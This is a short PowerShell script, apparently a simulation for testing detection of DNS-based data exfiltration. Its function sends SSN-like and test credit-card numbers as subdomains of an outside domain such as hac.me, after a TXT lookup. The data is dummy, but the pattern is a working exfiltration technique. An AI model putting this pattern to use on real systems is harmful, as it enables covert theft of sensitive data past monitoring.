# Example Exfil-Dns -DnsTxt google.com -DnsName hac.me

function Exfil-Dns
{ 
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DnsTxt,

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DnsName
    )

    # get data from text records
    Resolve-DnsName $DnsTxt -Type TXT -Server 8.8.8.8

    # send data to sub domains
    Invoke-RestMethod "http://123-45-6789.$DnsName/" 
    Invoke-RestMethod "http://123456789.$DnsName/" 
    Invoke-RestMethod "http://test123456789test.$DnsName/" 
    Invoke-RestMethod "http://6011208944444440.$DnsName/" 
    Invoke-RestMethod "http://6011208947270453.$DnsName/" 
    Invoke-RestMethod "http://6011-9980-8140-9707.$DnsName/" 
    Invoke-RestMethod "http://6011998081409707.$DnsName/" 
    Invoke-RestMethod "http://378282246310005.$DnsName/" 
    Invoke-RestMethod "http://4012888888881881.$DnsName/" 
}
